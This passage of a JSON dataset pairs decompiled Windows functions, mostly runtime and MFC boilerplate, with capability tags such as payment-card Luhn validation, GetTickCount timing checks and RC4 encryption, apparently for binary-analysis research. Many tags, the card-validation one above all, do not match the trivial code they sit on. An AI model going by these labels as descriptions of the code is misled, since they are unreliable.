        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00416bfb(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    code *pcVar5;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00419340();\n    *(unaff_EBP + -0x18) = extraout_ECX;\n    *extraout_ECX = vtable.COleControlSite.0;\n    pcVar5 = extraout_ECX[7];\n    *(unaff_EBP + -4) = 2;\n    if ((pcVar5 != NULL) && (*(pcVar5 + 0x68) == extraout_ECX)) {\n        *(pcVar5 + 0x68) = 0;\n    }\n    pcVar5 = extraout_ECX[0x23];\n    if (pcVar5 != NULL) {\n        fcn.004161fa();\n        fcn.0042f834(pcVar5);\n    }\n    fcn.0041201c();\n    fcn.00411c9d(extraout_ECX + 0xf, extraout_ECX[0x17]);\n    fcn.00411c9d(0x443d9c, extraout_ECX[0x18]);\n    fcn.00411c9d(0x443bec, extraout_ECX[0x22]);\n    piVar1 = extraout_ECX[0x16];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1);\n        extraout_ECX[0x16] = NULL;\n    }\n    piVar1 = extraout_ECX[0x14];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0x14))(piVar1);\n        (**(*extraout_ECX[0x14] + 8))(extraout_ECX[0x14]);\n        extraout_ECX[0x14] = NULL;\n    }\n    piVar1 = extraout_ECX[0x15];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1);\n        extraout_ECX[0x15] = NULL;\n    }\n    piVar1 = extraout_ECX[0x13];\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 0xc))(piVar1, 0);\n        (**(*extraout_ECX[0x13] + 0x18))(extraout_ECX[0x13], 1);\n        (**(*extraout_ECX[0x13] + 8))(extraout_ECX[0x13]);\n        extraout_ECX[0x13] = NULL;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(extraout_ECX + 0x2a);\n    pcVar5 = extraout_ECX[0x24];\n    *(unaff_EBP + -0x10) = 0;\n    while (pcVar5 != NULL) {\n        pcVar2 = *(pcVar5 + 0x18);\n        *(unaff_EBP + -0x14) = pcVar2;\n        if (*(unaff_EBP + -0x10) == 0) {\n            extraout_ECX[0x24] = pcVar2;\n        }\n        else {\n            *(*(unaff_EBP + -0x10) + 0x18) = pcVar2;\n        }\n        iVar3 = *(pcVar5 + 0xc);\n        if ((iVar3 != 0) && (*(iVar3 + 0x8c) != 0)) {\n            (**(**(iVar3 + 0x8c) + 4))(pcVar5, 0);\n        }\n        fcn.0042f834(pcVar5);\n        if (*(unaff_EBP + -0x10) != 0) {\n            *(unaff_EBP + -0x10) = *(*(unaff_EBP + -0x10) + 0x18);\n        }\n        pcVar5 = *(unaff_EBP + -0x14);\n    }\n    if (((extraout_ECX[0x26] != NULL) && (extraout_ECX[0x25] != NULL)) &&\n       (ppiVar4 = extraout_ECX[0x25] + 0x8c,  *ppiVar4 != NULL)) {\n        (**(**ppiVar4 + 8))(extraout_ECX, 0);\n    }\n    if ((extraout_ECX[7] != NULL) && (extraout_ECX[0x1c] != NULL)) {\n        piVar1 = extraout_ECX[7] + 0x70;\n        *piVar1 = *piVar1 + -1;\n    }\n    *(unaff_EBP + -4) = 1;\n    fcn.0043aad2();\n    fcn.004014f0();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042f31c();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 1240
    },
    "00417387": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417387(int32_t param_1, uint param_2)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_retaddr;\n    \n    if (*(param_1 + 0x4c) != 0) {\n        fcn.00411bda(param_2);\n        return;\n    }\n    uVar1 = fcn.00416dc9(param_1, 0);\n    if (((-(unaff_retaddr != 0) & 0x10U) + 0x10 & uVar1) != 0) {\n        (*_sym.imp.USER32.dll_SendMessageA)(*(param_1 + 0x1c), 0xf4, unaff_retaddr != 0, 1);\n    }\n    return;\n}\n",
        "token_count": 172
    },
    "00417aa1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417aa1(uint param_1)\n\n{\n    fcn.004192e0(param_1, 0, 0x10);\n    return;\n}\n",
        "token_count": 39
    },
    "00417d9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00417d9c(code *UNRECOVERED_JUMPTABLE)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = **in_FS_OFFSET;\n    // WARNING: Could not recover jumptable at 0x00417dc5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 90
    },
    "00418266": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.00418266(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EDI;\n    \n    uVar1 = fcn.00419e0a(*0x452228);\n    if (uVar1 < *0x452224 + (4 - *0x452228)) {\n        uVar3 = 0x800;\n        if (uVar1 < 0x800) {\n            uVar3 = uVar1;\n        }\n        iVar2 = fcn.00419b50(*0x452228, uVar3 + uVar1);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00419b50(*0x452228, uVar1 + 0x10);\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        *0x452224 = iVar2 + (*0x452224 - *0x452228 >> 2) * 4;\n        *0x452228 = iVar2;\n    }\n    **0x452224 = unaff_EDI;\n    *0x452224 = *0x452224 + 1;\n    return;\n}\n",
        "token_count": 269
    },
    "00418731": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00418731(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.0041bb3f(&var_20h, arg_ch, arg_10h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.0041b998(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 220
    },
    "00418788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418788(uint arg_8h, uint arg_ch)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_18h = 0;\n    var_20h = 0;\n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    fcn.0041bb3f(&var_20h, arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 118
    },
    "004187f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.004187f2(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x4418f0, 0x10);\n    fcn.0041c499(1, 0x44d528);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = fcn.0041c50e(0x44d528);\n    *(unaff_EBP + -0x1c) = uVar1;\n    uVar1 = fcn.0041bb3f(0x44d528, *(unaff_EBP + 8), unaff_EBP + 0xc);\n    *(unaff_EBP + -0x20) = uVar1;\n    fcn.0041c596(*(unaff_EBP + -0x1c), 0x44d528);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041884d();\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 302
    },
    "00418b80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00418b80(void)\n\n{\n    uint32_t in_EAX;\n    uchar *puVar1;\n    uint unaff_retaddr;\n    \n    if (in_EAX < 0x1000) {\n        *(&stack0x00000000 + -in_EAX) = unaff_retaddr;\n        return;\n    }\n    puVar1 = &stack0x00000004;\n    do {\n        puVar1 = puVar1 + -0x1000;\n        in_EAX = in_EAX - 0x1000;\n    } while (0xfff < in_EAX);\n    *(puVar1 + (-4 - in_EAX)) = unaff_retaddr;\n    return;\n}\n",
        "token_count": 167
    },
    "00418e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00418e40(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    float fVar4;\n    float10 in_ST0;\n    uint32_t uStack32;\n    float fStack28;\n    \n    uVar1 = ROUND(in_ST0);\n    uStack32 = uVar1;\n    fStack28 = uVar1 >> 0x20;\n    fVar4 = in_ST0;\n    if ((uStack32 != 0) || (fVar4 = fStack28,  (uVar1 & 0x7fffffff00000000) != 0)) {\n        if (fVar4 < 0) {\n            uVar2 = 0x80000000 < (in_ST0 - uVar1 ^ 0x80000000);\n            bVar3 = CARRY4(uStack32, uVar2);\n            uStack32 = uStack32 + uVar2;\n            fStack28 = fStack28 + bVar3;\n        }\n        else {\n            uVar2 = 0x80000000 < in_ST0 - uVar1;\n            bVar3 = uStack32 < uVar2;\n            uStack32 = uStack32 - uVar2;\n            fStack28 = fStack28 - bVar3;\n        }\n    }\n    return CONCAT44(fStack28, uStack32);\n}\n",
        "token_count": 306
    },
    "0041973b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041973b(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = 0x7fffffff;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.0041bb3f(&var_20h, arg_ch, &arg_10h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.0041b998(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 222
    },
    "00419858": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00419858(uchar *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uchar *var_20h;\n    int32_t var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    \n    var_1ch = arg_ch;\n    var_14h = 0x42;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    uVar1 = fcn.0041bb3f(&var_20h, arg_10h, &arg_14h);\n    if (arg_8h != NULL) {\n        var_1ch = var_1ch + -1;\n        if (var_1ch < 0) {\n            fcn.0041b998(0, &var_20h);\n        }\n        else {\n            *var_20h = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 228
    },
    "004198af": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004198af(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    var_14h = 0x49;\n    var_18h = arg_8h;\n    var_20h = arg_8h;\n    var_1ch = fcn.004196b0();\n    fcn.0041f35a(&var_20h, arg_ch, &arg_10h, arg_8h);\n    return;\n}\n",
        "token_count": 136
    },
    "0041993d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041993d(uint param_1)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    \n    if (*0x44d238 != NULL) {\n        (**0x44d238)(param_1);\n    }\n    iVar1 = 0;\n    ppcVar2 = 0x44c098;\n    do {\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*ppcVar2 != NULL) {\n            iVar1 = (**ppcVar2)();\n        }\n        ppcVar2 = ppcVar2 + 1;\n    } while (ppcVar2 < 0x44c0b0);\n    if (iVar1 == 0) {\n        fcn.00418346(0x41f152);\n        ppcVar2 = 0x44c000;\n        do {\n            if (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n            }\n            ppcVar2 = ppcVar2 + 1;\n        } while (ppcVar2 < 0x44c094);\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 259
    },
    "0041a618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a618(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.0041a459(param_1, param_2, param_3, 0);\n    return;\n}\n",
        "token_count": 52
    },
    "0041a62f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a62f(uint param_1, uint param_2, uint param_3)\n\n{\n    fcn.0041a459(param_1, param_2, param_3, 1);\n    return;\n}\n",
        "token_count": 53
    },
    "0041a92a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041a92a(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041b5aa();\n    return iVar1 + 8;\n}\n",
        "token_count": 45
    },
    "0041a933": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041a933(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041b5aa();\n    return iVar1 + 0xc;\n}\n",
        "token_count": 45
    },
    "0041ae79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041ae79(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_10h_00;\n    int32_t unaff_EBP;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00419d14(0x441a50, 0x40);\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    iVar3 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x20) = arg_10h_00;\n    *(unaff_EBP + -0x48) = 0;\n    *(unaff_EBP + -0x38) = *(arg_8h_00 + -4);\n    uVar1 = fcn.00418089(unaff_EBP + -0x50, *(iVar3 + 0x18));\n    *(unaff_EBP + -0x3c) = uVar1;\n    iVar2 = fcn.0041b5aa();\n    *(unaff_EBP + -0x40) = *(iVar2 + 0x7c);\n    iVar2 = fcn.0041b5aa();\n    *(unaff_EBP + -0x44) = *(iVar2 + 0x80);\n    iVar2 = fcn.0041b5aa();\n    *(iVar2 + 0x7c) = iVar3;\n    iVar3 = fcn.0041b5aa();\n    *(iVar3 + 0x80) = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 1;\n    uVar1 = fcn.0041811e(arg_8h_00, *(unaff_EBP + 0x14), arg_10h_00, *(unaff_EBP + 0x18), *(unaff_EBP + 0x1c));\n    *(unaff_EBP + -0x20) = uVar1;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041afce();\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 618
    },
    "0041c673": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0041c673(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t arg_8h_00;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00419d14(0x441b58, 8);\n    piVar1 = *(unaff_EBP + 8) * 8 + 0x44d788;\n    if (*piVar1 == 0) {\n        arg_8h_00 = fcn.004188ff(0x18);\n        if (arg_8h_00 == 0) {\n            puVar2 = fcn.0041a92a();\n            *puVar2 = 0xc;\n        }\n        else {\n            fcn.0041c713(10);\n            *(unaff_EBP + -4) = 0;\n            if (*piVar1 == 0) {\n                iVar3 = fcn.00421e19(arg_8h_00, 4000);\n                if (iVar3 == 0) {\n                    fcn.00418911(arg_8h_00);\n                    puVar2 = fcn.0041a92a();\n                    *puVar2 = 0xc;\n                    fcn.004181ba(unaff_EBP + -0x10, 0xffffffff);\n                    goto code_r0x0041c704;\n                }\n                *piVar1 = arg_8h_00;\n            }\n            else {\n                fcn.00418911(arg_8h_00);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041c70a();\n        }\n    }\ncode_r0x0041c704:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 450
    },
    "0041c7f7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0041c7f7(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *0x450fb0;\n    while( true ) {\n        if (*0x450fb0 + *0x450fac * 0x14 <= uVar1) {\n            return 0;\n        }\n        if (param_1 - *(uVar1 + 0xc) < 0x100000) break;\n        uVar1 = uVar1 + 0x14;\n    }\n    return uVar1;\n}\n",
        "token_count": 128
    },
    "0041cb3a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0041cb3a(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (*0x450fac == *0x450fbc) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x450fc4, 0, *0x450fb0, (*0x450fbc * 5 + 0x50) * 4);\n        if (iVar2 == 0) {\n            return NULL;\n        }\n        *0x450fbc = *0x450fbc + 0x10;\n        *0x450fb0 = iVar2;\n    }\n    puVar1 = *0x450fb0 + *0x450fac * 0x14;\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x450fc4, 8, 0x41c4);\n    puVar1[4] = iVar2;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x100000, 0x2000, 4);\n        puVar1[3] = iVar2;\n        if (iVar2 != 0) {\n            puVar1[2] = 0xffffffff;\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            *0x450fac = *0x450fac + 1;\n            *puVar1[4] = 0xffffffff;\n            return puVar1;\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x450fc4, 0, puVar1[4]);\n    }\n    return NULL;\n}\n",
        "token_count": 380
    },
    "0041d976": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nbool fcn.0041d976(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBX;\n    uint32_t uVar6;\n    \n    if (*0x44d8b4 == 0) {\n        return false;\n    }\n    iVar1 = unaff_EBX[5];\n    if ((iVar1 != *0x44d948) || (iVar1 != *0x44d954)) {\n        if (*0x450a44 == 0) {\n            fcn.0041d7be(1, 1, iVar1, 1, 0, 0, 0, 0, 0);\n            fcn.0041d7be(0, 1, iVar1, 5, 0, 0, 0, 0, 0);\n        }\n        else {\n            if (*0x450a30 != 0) {\n                uVar6 = *0x450a36;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x450a34;\n                uVar6 = 0;\n                uVar4 = *0x450a36;\n            }\n            fcn.0041d7be(1, *0x450a30 == 0, iVar1, uVar4, uVar3, uVar6, *0x450a3a, *0x450a3c, *0x450a3e);\n            if (*0x4509dc != 0) {\n                uVar6 = *0x4509e2;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x4509e0;\n                uVar6 = 0;\n                uVar4 = *0x4509e2;\n            }\n            fcn.0041d7be(0, *0x4509dc == 0, iVar1, uVar4, uVar3, uVar6, *0x4509e6, *0x4509e8, *0x4509ea);\n        }\n    }\n    iVar1 = unaff_EBX[7];\n    if (*0x44d94c < *0x44d958) {\n        if ((iVar1 < *0x44d94c) || (*0x44d958 < iVar1)) {\n            return false;\n        }\n        if ((*0x44d94c < iVar1) && (iVar1 < *0x44d958)) {\n            return true;\n        }\n    }\n    else {\n        if (iVar1 < *0x44d958) {\n            return true;\n        }\n        if (*0x44d94c < iVar1) {\n            return true;\n        }\n        if ((*0x44d958 < iVar1) && (iVar1 < *0x44d94c)) {\n            return false;\n        }\n    }\n    iVar5 = ((unaff_EBX[2] * 0x3c + unaff_EBX[1]) * 0x3c + *unaff_EBX) * 1000;\n    if (iVar1 == *0x44d94c) {\n        bVar2 = *0x44d950 <= iVar5;\n    }\n    else {\n        bVar2 = iVar5 < *0x44d95c;\n    }\n    return bVar2;\n}\n",
        "token_count": 779
    },
    "0041e00c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e00c(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t var_2ch;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    fcn.0042260e(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.004224dd((0 < arg_10h) + (var_2ch == 0x2d) + arg_ch, arg_10h + 1, &var_2ch);\n    fcn.0041df5e(arg_10h, arg_14h, 0);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 190
    },
    "0041e114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e114(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    fcn.0042260e(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    fcn.004224dd((var_2ch == 0x2d) + arg_ch, var_28h + arg_10h, &var_2ch);\n    fcn.0041e078(arg_ch, arg_10h, 0);\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 182
    },
    "0041e176": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e176(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    char *arg_8h_00;\n    int32_t iVar1;\n    char *pcVar2;\n    int32_t var_2ch;\n    int32_t var_28h;\n    uint var_1ch;\n    uint var_4h;\n    \n    var_4h = *0x44d270;\n    fcn.0042260e(*arg_8h, arg_8h[1], &var_2ch, &var_1ch);\n    iVar1 = var_28h + -1;\n    arg_8h_00 = (var_2ch == 0x2d) + arg_ch;\n    fcn.004224dd(arg_8h_00, arg_10h, &var_2ch);\n    var_28h = var_28h + -1;\n    if ((var_28h < -4) || (arg_10h <= var_28h)) {\n        fcn.0041df5e(arg_10h, arg_14h, 1);\n    }\n    else {\n        if (iVar1 < var_28h) {\n            do {\n                pcVar2 = arg_8h_00;\n                arg_8h_00 = pcVar2 + 1;\n            } while (*pcVar2 != '\\0');\n            pcVar2[-1] = '\\0';\n        }\n        fcn.0041e078(arg_ch, arg_10h, 1);\n    }\n    fcn.004192ca();\n    return;\n}\n",
        "token_count": 367
    },
    "0041f10e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041f10e(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x4420f8, 0xc);\n    *(unaff_EBP + -0x1c) = 0x4468b4;\n    while (*(unaff_EBP + -0x1c) < 0x4468b4) {\n        *(unaff_EBP + -4) = 0;\n        if (**(unaff_EBP + -0x1c) != NULL) {\n            (***(unaff_EBP + -0x1c))();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n    }\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 230
    },
    "004200f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t * fcn.004200f0(uint32_t *param_1, uint32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    \n    uVar4 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar4 != 0) {\n        uVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (uVar1 == 0) goto code_r0x00420143;\n        uVar4 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar5 = puVar3;\n            puVar3 = puVar5 + 1;\n        } while (((*puVar5 ^ 0xffffffff ^ *puVar5 + 0x7efefeff) & 0x81010100) == 0);\n        uVar4 = *puVar5;\n        if (uVar4 == '\\0') goto code_r0x00420155;\n        if (uVar4 >> 8 == '\\0') {\n            puVar5 = puVar5 + 1;\n            goto code_r0x00420155;\n        }\n        if ((uVar4 & 0xff0000) == 0) {\n            puVar5 = puVar5 + 2;\n            goto code_r0x00420155;\n        }\n    } while ((uVar4 & 0xff000000) != 0);\ncode_r0x00420143:\n    puVar5 = puVar3 + -1;\ncode_r0x00420155:\n    uVar4 = param_2 & 3;\n    while (uVar4 != 0) {\n        uVar1 = *param_2;\n        uVar4 = uVar1;\n        param_2 = param_2 + 1;\n        if (uVar1 == 0) goto code_r0x004201d0;\n        *puVar5 = uVar1;\n        puVar5 = puVar5 + 1;\n        uVar4 = param_2 & 3;\n    }\n    do {\n        uVar2 = *param_2;\n        uVar4 = *param_2;\n        param_2 = param_2 + 1;\n        if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {\n            if (uVar4 == '\\0') {\ncode_r0x004201d0:\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if (uVar4 >> 8 == '\\0') {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n            if ((uVar4 & 0xff0000) == 0) {\n                *puVar5 = uVar4;\n                *(puVar5 + 2) = 0;\n                return param_1;\n            }\n            if ((uVar4 & 0xff000000) == 0) {\n                *puVar5 = uVar4;\n                return param_1;\n            }\n        }\n        *puVar5 = uVar4;\n        puVar5 = puVar5 + 1;\n    } while( true );\n}\n",
        "token_count": 746
    },
    "004200e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
